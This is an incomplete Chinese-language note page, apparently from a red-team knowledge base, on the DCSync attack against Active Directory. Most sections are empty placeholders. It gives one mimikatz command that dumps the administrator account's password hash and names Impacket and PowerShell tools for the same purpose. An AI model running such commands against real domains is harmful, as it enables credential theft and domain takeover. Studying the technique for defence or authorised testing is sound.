---
description: 横向移动 / 滥用身份验证 /
---

# ✔️ DCSync攻击 - Domain Controller Synchronization

## 先决条件

*





## 常用工具

### mimikatz.exe

```powershell
mimikatz.exe
# 指定要同步的目标账户
lsadump::dcsync / user:administrator
```

### Impacket

* 常用脚本：**secretsdump.py**

```bash
// Some code
```

### Powershell

* 常用脚本：Invocke-DCSync.ps1

```powershell
// Some code
```

## 攻击步骤

*





{% hint style="info" %}
DCSync攻击的本质是利用了AD本身的功能，攻方模拟一个有复制权限的域控向目标内网中的其他域控发出同步数据的请求，以获取到特定的高权限的账户的密码哈希和其他敏感信息。其过程是利用的合法的DC同步功能，没有其他恶意操作
{% endhint %}
